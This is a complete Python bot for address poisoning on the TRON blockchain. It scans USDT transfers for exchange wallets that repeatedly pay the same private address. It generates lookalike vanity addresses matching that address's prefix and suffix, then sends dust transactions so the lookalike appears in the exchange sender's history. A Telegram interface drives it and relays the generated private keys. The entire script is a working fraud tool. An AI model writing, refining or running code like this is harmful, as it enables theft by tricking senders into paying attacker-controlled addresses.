import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timezone
from tronpy import Tron
from tronpy.keys import PrivateKey

# =========================
# 🟢 USER SETTINGS (BROAD TEST RULES)
# =========================
TARGET_PAIRS = 5
MIN_BALANCE_USD = 0          # Broad for testing
MIN_TRANSFER_USD = 50        # Broad for testing
REQUIRED_TRANSFERS = 2       # Must receive 2+ from same sender
WINDOW_DAYS = 30             # Look back 30 days
GAS_COST_PER_PAIR_TRX = 2.2  # Est. gas cost (1.1 TRX x 2)

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

# =========================
# 1. LOAD SECRETS
# =========================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, PRIVATE_KEY]):
    raise Exception("Missing required secrets!")

# Global storage
found_pairs = []
vanity_wallets = {}
transaction_logs = []
checked_receivers = set()

# =========================
# 2. TELEGRAM BOT
# =========================
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message, parse_mode="HTML"):
    if not TELEGRAM_BOT_TOKEN or not CHAT_ID: return
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": parse_mode}, timeout=10)
    except: pass

def get_telegram_updates(offset):
    if not TELEGRAM_BOT_TOKEN: return []
    try:
        r = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
        return r.json().get("result", [])
    except: return []

# =========================
# 3. API HELPERS (FIXED FIELD NAMES)
# =========================
def get_recent_transfers(limit=200):
    """Fetches recent USDT transfers using the CORRECT field 'token_transfers'"""
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"start": 0, "limit": limit, "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", "sort": "-timestamp"},
            timeout=30
        )
        data = r.json()
        return data.get("token_transfers", []) # THE FIX
    except Exception as e:
        print(f"API Error: {e}")
        return []

def is_cex_by_tag(tag_dict):
    """Checks if the sender tag indicates a CEX directly from the transfer data"""
    if not tag_dict: return False, None
    tag_name = tag_dict.get("from_address_tag", "").lower()
    for keyword in CEX_KEYWORDS:
        if keyword in tag_name:
            return True, tag_dict.get("from_address_tag", "Unknown").capitalize()
    return False, None

def get_wallet_history(address):
    """Fetches USDT history for a specific address"""
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"address": address, "limit": 10, "sort": "-timestamp", "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
            timeout=30
        )
        data = r.json()
        return data.get("token_transfers", [])
    except: return []

# =========================
# 4. MAIN SCANNER
# =========================
def main():
    print(" Starting Complete Bot...")
    send_telegram("🚀 <b>Complete Bot Started</b>\nLooking for CEX -> Private pairs...")
    
    while len(found_pairs) < TARGET_PAIRS:
        print(f"\n🔄 Scanning... Found {len(found_pairs)}/{TARGET_PAIRS}")
        
        transfers = get_recent_transfers(limit=200)
        print(f"📡 Got {len(transfers)} transfers")
        
        if not transfers:
            time.sleep(10)
            continue
        
        # Group by Receiver
        receivers = defaultdict(list)
        for tx in transfers:
            from_addr = tx.get("from_address")
            to_addr = tx.get("to_address")
            amount = int(tx.get("quant", 0)) / 1_000_000
            from_tag = tx.get("from_address_tag", {})
            
            if from_addr and to_addr and amount >= MIN_TRANSFER_USD:
                receivers[to_addr].append({"from": from_addr, "amount": amount, "tag": from_tag})
        
        # Find patterns
        for wallet_b, txs in receivers.items():
            if len(found_pairs) >= TARGET_PAIRS: break
            if wallet_b in checked_receivers: continue
            
            sender_counts = defaultdict(list)
            for tx in txs:
                sender_counts[tx["from"]].append(tx)
            
            for sender, sender_txs in sender_counts.items():
                if len(sender_txs) >= REQUIRED_TRANSFERS:
                    is_cex, cex_name = is_cex_by_tag(sender_txs[0]["tag"])
                    
                    if is_cex:
                        checked_receivers.add(wallet_b)
                        found_pairs.append({
                            "wallet_a": sender, "wallet_b": wallet_b,
                            "cex_name": cex_name, "amount": sender_txs[0]["amount"]
                        })
                        print(f"✅ Pair Found: {cex_name} -> {wallet_b}")
                        send_telegram(f"✅ <b>Pair {len(found_pairs)}/{TARGET_PAIRS}</b>\n🏦 {cex_name}: <code>{sender[:20]}...</code>\n👤 Private: <code>{wallet_b[:20]}...</code>\n💰 ${sender_txs[0]['amount']}")
                    break
        
        if len(found_pairs) < TARGET_PAIRS:
            time.sleep(5)
    
    interactive_mode()

# =========================
# 5. VANITY & TRANSFERS
# =========================
def generate_vanity_wallet(target_address, max_attempts=10000):
    print(f"🔨 Generating vanity for {target_address[:20]}...")
    best_addr, best_key, best_score = None, None, 0
    best_prefix, best_suffix = 0, 0
    
    for _ in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        prefix = sum(1 for i in range(8) if i < len(addr) and i < len(target_address) and addr[i] == target_address[i])
        suffix = sum(1 for i in range(1, 9) if i <= len(addr) and i <= len(target_address) and addr[-i] == target_address[-i])
        score = prefix + suffix
        
        if score > best_score:
            best_score, best_prefix, best_suffix = score, prefix, suffix
            best_addr, best_key = addr, key.hex()
            if score >= 8: break
            
    wallet_id = f"vanity_{len(vanity_wallets)+1}"
    vanity_wallets[wallet_id] = {
        "address": best_addr, "private_key": best_key, "target": target_address,
        "prefix_match": best_prefix, "suffix_match": best_suffix, "total_score": best_score,
        "created_at": datetime.now(timezone.utc).isoformat()
    }
    return best_addr, best_key, best_prefix, best_suffix

def interactive_mode():
    total_cost = len(found_pairs) * GAS_COST_PER_PAIR_TRX
    send_telegram(
        f"🎯 <b>Target Reached! Found {len(found_pairs)} pairs</b>\n"
        f"Est. Gas Cost: <b>{total_cost:.2f} TRX</b>\n\n"
        f"<b>Commands:</b>\n"
        f"• <b>info</b> - Show pairs & gas cost\n"
        f"• <b>exclude [Address]</b> - Remove a pair\n"
        f"• <b>history [Address]</b> - Check wallet USDT history\n"
        f"• <b>logs</b> - Show executed transfers\n"
        f"• <b>vanity</b> - List generated wallets\n"
        f"• <b>vanity [ID]</b> - Wallet details (e.g. <i>vanity vanity_1</i>)\n"
        f"• <b>generate [1-5]</b> - Make vanity for pair\n"
        f"• <b>transfer</b> - Execute all"
    )
    
    last_id = 0
    go = False
    while not go:
        updates = get_telegram_updates(last_id)
        for u in updates:
            last_id = u["update_id"]
            if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
                text = u["message"].get("text", "").strip()
                
                # INFO
                if text.lower() == "info":
                    msg = f"📋 <b>Found Pairs ({len(found_pairs)})</b>\nEst. Gas: <b>{total_cost:.2f} TRX</b>\n\n"
                    for i, p in enumerate(found_pairs):
                        msg += f"<b>#{i+1}</b> {p['cex_name']} → <code>{p['wallet_b'][:20]}...</code> (${p['amount']})\n"
                    send_telegram(msg)
                
                # EXCLUDE
                elif text.lower().startswith("exclude"):
                    parts = text.split()
                    if len(parts) > 1:
                        addr = parts[1]
                        before = len(found_pairs)
                        found_pairs[:] = [p for p in found_pairs if p['wallet_b'] != addr and p['wallet_a'] != addr]
                        send_telegram(f"🗑️ Removed {before - len(found_pairs)} pair(s)")
                
                # HISTORY
                elif text.lower().startswith("history"):
                    parts = text.split()
                    if len(parts) > 1:
                        addr = parts[1]
                        send_telegram(f"🔍 Fetching history for <code>{addr[:20]}...</code>...")
                        txs = get_wallet_history(addr)
                        if not txs:
                            send_telegram("📭 No USDT history found.")
                        else:
                            msg = f"📜 <b>History for {addr[:20]}...</b>\n\n"
                            for i, tx in enumerate(txs[:5]):
                                amount = int(tx.get("quant", 0)) / 1_000_000
                                date = datetime.fromtimestamp(tx.get("block_ts", 0)/1000).strftime("%Y-%m-%d")
                                msg += f"<b>#{i+1}</b> {date} | {amount:.2f} USDT\n"
                            send_telegram(msg)
                
                # LOGS
                elif text.lower() == "logs":
                    if not transaction_logs:
                        send_telegram("📭 No executed transfers yet.")
                    else:
                        msg = "📜 <b>Executed Logs</b>\n\n"
                        for i, log in enumerate(transaction_logs):
                            msg += f"<b>#{i+1}</b>\nVanity: <code>{log['vanity'][:20]}...</code>\nTX1: <code>{log['tx1'][:20]}...</code>\n\n"
                        send_telegram(msg[:4000])
                
                # VANITY LIST
                elif text.lower() == "vanity":
                    if not vanity_wallets:
                        send_telegram("📭 No vanity wallets yet. Type <b>generate 1</b>")
                    else:
                        msg = "📋 <b>Vanity Wallets</b>\n\n"
                        for wid, d in vanity_wallets.items():
                            msg += f"<b>{wid}</b>: {d['address'][:20]}... (Score: {d['total_score']})\n"
                        send_telegram(msg)
                
                # VANITY DETAILS
                elif text.lower().startswith("vanity "):
                    parts = text.split()
                    if len(parts) > 1 and parts[1] in vanity_wallets:
                        d = vanity_wallets[parts[1]]
                        msg = f"📊 <b>{parts[1]}</b>\nAddr: <code>{d['address']}</code>\nKey: <code>{d['private_key']}</code>\nMatch: {d['prefix_match']}/8 + {d['suffix_match']}/8\nCreated: {d['created_at']}"
                        send_telegram(msg)
                    else:
                        send_telegram("❌ Invalid ID. Use <b>vanity</b> to see list.")
                
                # GENERATE
                elif text.lower().startswith("generate"):
                    parts = text.split()
                    if len(parts) > 1:
                        try:
                            idx = int(parts[1]) - 1
                            if 0 <= idx < len(found_pairs):
                                addr, key, p, s = generate_vanity_wallet(found_pairs[idx]['wallet_b'])
                                send_telegram(f"✅ <b>Generated</b>\nAddr: <code>{addr}</code>\nKey: <code>{key}</code>\nMatch: {p}+{s}")
                        except: send_telegram("❌ Invalid number")
                
                # TRANSFER
                elif text.lower() == "transfer":
                    if not found_pairs:
                        send_telegram("❌ No pairs left!")
                    else:
                        go = True
                        break
        if not go: time.sleep(5)
    
    # EXECUTE
    send_telegram("🚀 <b>Executing transfers...</b>")
    try:
        tron = Tron()
        for i, pair in enumerate(found_pairs):
            print(f"Processing {i+1}...")
            addr, key, p, s = generate_vanity_wallet(pair['wallet_b'])
            if not addr: continue
            
            priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
            tx1 = tron.trx.transfer(priv.public_key.to_base58check_address(), addr, 1).build().sign(priv).broadcast().txid
            time.sleep(3)
            priv2 = PrivateKey(bytes.fromhex(key))
            tx2 = tron.trx.transfer(priv2.public_key.to_base58check_address(), pair['wallet_a'], 1).build().sign(priv2).broadcast().txid
            
            transaction_logs.append({"vanity": addr, "tx1": tx1, "tx2": tx2})
            send_telegram(f"✅ <b>#{i+1}</b>\nVanity: <code>{addr}</code>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
            time.sleep(5)
        send_telegram("✅ <b>All tasks completed!</b>")
    except Exception as e:
        send_telegram(f"❌ Transfer Error: {e}")

if __name__ == "__main__":
    main()
